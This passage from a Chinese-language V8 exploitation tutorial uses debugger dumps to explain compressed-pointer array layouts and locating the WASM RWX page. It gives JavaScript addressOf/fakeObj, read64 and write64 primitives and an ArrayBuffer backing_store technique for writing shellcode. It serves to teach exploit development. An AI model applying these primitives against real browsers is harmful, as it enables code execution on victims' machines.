     - wrapper_code: 0x24c60000b3a1 
     - instance: 0x24c6081d3509 
     - function_index: 0
     - signature: 0x24c608049bd1 
     - wrapper_budget: 1000
在查看`instance`结构：
     - instance: 0x24c6081d3509 
    pwndbg> job 0x24c6081d3509
    0x24c6081d3509: [WasmInstanceObject] in OldSpace
     - map: 0x24c608207439  [FastProperties]
     - prototype: 0x24c608048259 
     - elements: 0x24c60800222d  [HOLEY_ELEMENTS]
     - module_object: 0x24c6080499e5 
     - exports_object: 0x24c608049b99 
     - native_context: 0x24c6081c3649 
     - memory_object: 0x24c6081d34f1 
     - table 0: 0x24c608049b69 
     - imported_function_refs: 0x24c60800222d 
     - indirect_function_table_refs: 0x24c60800222d 
     - managed_native_allocations: 0x24c608049b21 
     - memory_start: 0x7f6e20000000
     - memory_size: 65536
     - memory_mask: ffff
     - imported_function_targets: 0x55a2eca392f0
     - globals_start: (nil)
     - imported_mutable_globals: 0x55a2eca39310
     - indirect_function_table_size: 0
     - indirect_function_table_sig_ids: (nil)
     - indirect_function_table_targets: (nil)
     - properties: 0x24c60800222d 
     - All own properties (excluding elements): {}
仔细查看能发现，`instance`结构就是js代码中的`wasmInstance`变量的地址，在代码中我们加入了`%DebugPrint(wasmInstance);`，所以也会输出该结构的信息，可以去对照看看。
我们再来查看这个结构的内存布局：
    pwndbg> x/16gx 0x24c6081d3509-1
    0x24c6081d3508: 0x0800222d08207439 0x200000000800222d
    0x24c6081d3518: 0x0001000000007f6e 0x0000ffff00000000
    0x24c6081d3528: 0xeca1448000000000 0x0800222d000055a2
    0x24c6081d3538: 0x000055a2eca392f0 0x000000000800222d
    0x24c6081d3548: 0x0000000000000000 0x0000000000000000
    0x24c6081d3558: 0x0000000000000000 0x000055a2eca39310
    0x24c6081d3568: 0x000055a2eca14420 0x00001aca69e92000
仔细看，能发现，rwx段的起始地址储存在`instance+0x68`的位置，不过这个不用记，不同版本，这个偏移值可能会有差距，可以在写exp的时候通过上述调试的方式进行查找。
根据WASM的特性，我们的目的可以更细化了，现在我们的目的变为了把`shellcode`写到WASM的代码段，然后执行WASM函数，那么就能执行`shellcode`了。
# 任意读写
最近我研究的几个V8的漏洞，任意读写都是使用的一个套路，目前我是觉得这个套路很通用的，感觉V8相关的利用都是用这类套路。（不过我学的时间短，这块的眼界也相对短浅，以后可能会遇到其他情况）
首先来看看JavaScript的两种类型的变量的结构：
    $ cat test.js
    a = [2.1];
    b = {"a": 1};
    c = [b];
    %DebugPrint(a);
    %DebugPrint(b);
    %DebugPrint(c);
    %SystemBreak();
首先是变量`a`的结构：
    DebugPrint: 0xe07080496d1: [JSArray]
     - map: 0x0e0708203ae1  [FastProperties]
     - prototype: 0x0e07081cc139 
     - elements: 0x0e07080496c1  [PACKED_DOUBLE_ELEMENTS]
     - length: 1
     - properties: 0x0e070800222d 
     - All own properties (excluding elements): {
        0xe0708004905: [String] in ReadOnlySpace: #length: 0x0e070814215d  (const accessor descriptor), location: descriptor
     }
     - elements: 0x0e07080496c1  {
               0: 2.1
     }
    pwndbg> job 0x0e07080496c1
    0xe07080496c1: [FixedDoubleArray]
     - map: 0x0e0708002a95 
     - length: 1
               0: 2.1
    pwndbg> x/8gx 0xe07080496d1-1
    0xe07080496d0:  0x0800222d08203ae1 0x00000002080496c1
    0xe07080496e0:  0x0800222d08207961 0x000000020800222d
    0xe07080496f0:  0x0001000108005c31 0x080021f900000000
    0xe0708049700:  0x0000008808007aad 0x0800220500000002
    pwndbg> x/8gx 0x0e07080496c1-1
    0xe07080496c0:  0x0000000208002a95 0x4000cccccccccccd
    0xe07080496d0:  0x0800222d08203ae1 0x00000002080496c1
    0xe07080496e0:  0x0800222d08207961 0x000000020800222d
    0xe07080496f0:  0x0001000108005c31 0x080021f900000000
变量`a`的结构如下：
    | 32 bit map addr | 32 bit properties addr | 32 bit elements addr | 32 bit length|
因为在当前版本的v8中，对地址进行了压缩，因为高32bit地址的值是一样的，所以只需要保存低32bit的地址就行了。
`elements`结构保存了数组的值，结构为：
    | 32 bit map addr | 32 bit length | value ......
变量`a`结构中的`length`，表示的是当前数组的已经使用的长度，`elements`表示该数组已经申请的长度，申请了不代表已经使用了。这两个长度在内存中储存的值为实际值的2倍，为啥这么设计，暂时还没了解。
仔细研究上面的内存布局，能发现，`elements`结构之后是紧跟着变量`a`的结构。很多洞都是这个时候让变量`a`溢出，然后这样就可以读写其结构的map和length的值。
接下来在一起看看变量`b`和`c`:
    变量c：
    DebugPrint: 0xe0708049719: [JSArray]
     - map: 0x0e0708203b31  [FastProperties]
     - prototype: 0x0e07081cc139 
     - elements: 0x0e070804970d  [PACKED_ELEMENTS]
     - length: 1
     - properties: 0x0e070800222d 
     - All own properties (excluding elements): {
        0xe0708004905: [String] in ReadOnlySpace: #length: 0x0e070814215d  (const accessor descriptor), location: descriptor
     }
     - elements: 0x0e070804970d  {
               0: 0x0e07080496e1 
     }
    变量b：
    DebugPrint: 0xe07080496e1: [JS_OBJECT_TYPE]
     - map: 0x0e0708207961  [FastProperties]
     - prototype: 0x0e07081c4205 
     - elements: 0x0e070800222d  [HOLEY_ELEMENTS]
     - properties: 0x0e070800222d 
     - All own properties (excluding elements): {
        0xe0708007aad: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
     }
    pwndbg> job 0x0e070804970d
    0xe070804970d: [FixedArray]
     - map: 0x0e0708002205 
     - length: 1
               0: 0x0e07080496e1 
    pwndbg> x/8gx 0xe0708049719-1
    0xe0708049718:  0x0800222d08203b31 0x000000020804970d
    0xe0708049728:  0x0000000000000000 0x0000000000000000
    0xe0708049738:  0x0000000000000000 0x0000000000000000
    0xe0708049748:  0x0000000000000000 0x0000000000000000
    pwndbg> x/8gx 0x0e070804970d-1
    0xe070804970c:  0x0000000208002205 0x08203b31080496e1
    0xe070804971c:  0x0804970d0800222d 0x0000000000000002
    0xe070804972c:  0x0000000000000000 0x0000000000000000
    0xe070804973c:  0x0000000000000000 0x0000000000000000
变量`c`的结构和变量`a`的基本上是一样的，只是变量`a`储存的是`double`类型的变量，所以value都是64bit的，而变量`c`储存的是对象类型的变量，储存的是地址，也对地址进行了压缩，所以长度是32bit。
## 任意变量地址读
既然内存结构这么一致，那么使用`a[0]`或者`c[0]`取值的时候，js是怎么判断结构类型的呢？通过看代码，或者gdb实际测试都能发现，是根据变量结构的map值来确定的。
也就是说如果我把变量`c`的map地址改成变量`a`的，那么当我执行`c[0]`的时候，获取到的就是变量`b`的地址了。这样，就能达到任意变量地址读的效果，步骤如下：
  1. 把`c[0]`的值设置为你想获取地址的变量，比如`c[0]=a;`。
  2. 然后通过漏洞，把`c`的map地址修改成`a`的map地址。
  3. 读取`c[0]`的值，该值就为变量`a`的低32bit地址。
在本文说的套路中，上述步骤被封装为`addressOf`函数。
该逻辑还达不到任意地址读的效果，所以还需要继续研究。
## double to object
既然我们可以把对象数组变为浮点型数组，那么是不是也可以把浮点型数组变为对象数组，步骤如下：
  1. 把`a[0]`的值设置为自己构造的某个对象的地址还需要加1。
  2. 然后通过漏洞，把`a`的map地址修改成`c`的map地址。
  3. 获取`a[0]`的值
这个过程可以封装为`fakeObj`函数。
## 任意读
这个时候我们构造这样一个变量：
    var fake_array = [
      double_array_map,
      itof(0x4141414141414141n)
    ];
该变量的结构大致如下：
    | 32 bit elements map | 32 bit length | 64 bit double_array_map |
    | 64 bit 0x4141414141414141n | 32 bit fake_array map | 32 bit properties |
    | 32 bit elements | 32 bit length|
根据分析，理论上来说布局应该如上所示，但是会根据漏洞不通，导致堆布局不通，所以导致`elements`地址的不同，具体情况，可以写exp的时候根据通过调试来判断。
所以我可以使用`addressOf`获取`fake_array`地址：`var fake_array_addr =
addressOf(fake_array);`。
计算得到`fake_object_addr = fake_array_addr -0x10n;`，然后使用`fakeObj`函数，得到你构造的对象：`var fake_object =
fakeObj(fake_object_addr);`
这个时候不要去查看`fake_object`的内容，因为其`length`字段和`elements`字段都被设置为了无效值(0x41414141)。
这个时候我们就能通过`fake_array`数组来达到任意读的目的了，下面就是一个通用的任意读函数`read64`：
    function read64(addr)
    {
        fake_array[1] = itof(addr - 0x8n + 0x1n);
        return fake_object[0];
    }
## 任意写
同理，也能构造出任意写`write64`：
    function write64(addr, data)
    {
        fake_array[1] = itof(addr - 0x8n + 0x1n);
        fake_object[0] = itof(data);
    }
我们可以这么理解上述过程，`fakeObj`对象相当于把把浮点数数组变量`a`改成了二维浮点数数组：`a =
[[1.1]]`，而`fake_array[1]`值的内存区域属于`fake_object`对象的`elements`和`length`字段的位置，所以我们可以通过修改`fake_array[1]`的值，来控制`fake_object`，以达到任意读写的效果。
## 写shellcode
不过上述的任意写却没办法把我们的`shellcode`写到rwx区域，因为`写入的地址=实际地址-0x8+0x1`，前面还需要有8字节的map地址和length，而rwx区域根据我们调试的时候看到的内存布局，需要从该内存段的起始地址开始写，所以`该地址-0x8+0x1`是一个无效地址。
所以需要另辟蹊径，来看看下面的代码：
    $ cat test.js
    var data_buf = new ArrayBuffer(0x10);
    var data_view = new DataView(data_buf);
    data_view.setFloat64(0, 2.0, true);
    %DebugPrint(data_buf);
    %DebugPrint(data_view);
    %SystemBreak();
首先看看`data_buf`变量的结构：
    DebugPrint: 0x2ead0804970d: [JSArrayBuffer]
     - map: 0x2ead08203271  [FastProperties]
     - prototype: 0x2ead081ca3a5 
     - elements: 0x2ead0800222d  [HOLEY_ELEMENTS]
     - embedder fields: 2
     - backing_store: 0x555c12bb9050
     - byte_length: 16
     - detachable
     - properties: 0x2ead0800222d 
     - All own properties (excluding elements): {}
     - embedder fields = {
        0, aligned pointer: (nil)
        0, aligned pointer: (nil)
     }
再来看看`backing_store`字段的内存：
    pwndbg> x/8gx 0x555c12bb9050
    0x555c12bb9050: 0x4000000000000000 0x0000000000000000
    0x555c12bb9060: 0x0000000000000000 0x0000000000000041
    0x555c12bb9070: 0x0000555c12bb9050 0x0000000000000010
    0x555c12bb9080: 0x0000000000000010 0x00007ffd653318a8
`double`型的2.0以十六进制表示就是`0x4000000000000000`，所以可以看出`data_buf`变量的值存储在一段连续的内存区域中，通过`backing_store`指针指向该内存区域。
所以我们可以利用该类型，通过修改`backing_store`字段的值为rwx内存地址，来达到写`shellcode`的目的。